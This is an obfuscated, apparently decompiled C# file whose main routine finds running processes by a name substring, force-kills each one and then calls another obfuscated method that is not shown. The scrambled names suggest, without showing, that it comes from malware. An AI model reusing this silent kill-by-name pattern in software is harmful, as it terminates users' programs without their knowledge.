using System;
using System.Diagnostics;

namespace coxZRmDhvSAWo;

public sealed class BiRseovlcEsE
{
	public static bool rGxuzuSydnzhWy(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void DxdvksakEt(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (rGxuzuSydnzhWy(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					aSOyqwTwiifNb.fbCyLjnfYvogRbL();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
